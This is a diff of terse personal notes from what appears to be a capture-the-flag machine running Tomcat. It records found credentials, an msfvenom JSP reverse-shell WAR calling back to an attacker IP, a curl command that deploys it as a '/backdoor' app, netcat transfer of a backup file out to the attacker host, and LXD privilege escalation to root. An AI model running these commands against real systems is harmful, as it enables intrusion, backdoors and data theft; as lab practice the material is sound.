@@ -53,6 +53,20 @@ gave me the tomcat
 </tomcat-users>
 ----------------------------------------------
 The msf tomcat doesnt work becuase the /manger isnt working with our credentials
+The manager-script means that even though we can't acess the gui we can make changes using the cli
 ------------------------------------------
 curl -u tomcat:$3cureP4s5w0rd123! http://10.10.10.194:8080/host-manager/text/list
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.19 LPORT=4444 -f war > shell.war
+curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/backdoor'
+------------------------------------------------------------------------------------------
+Found a backup file will download
+nc -l -p 3333 >16162020_backup.zip
+nc -w 3 10.10.15.19 3333 < 16162020_backup.zip
+admin@it
+-------------------------------------------------------------------------
+This let me su to ash 
+sudo -l nothing
+id gives an lxd group
+https://www.hackingarticles.in/lxd-privilege-escalation/
+ Simply following the steps gave me root access
+ did have to lxd init because no storage pool was found
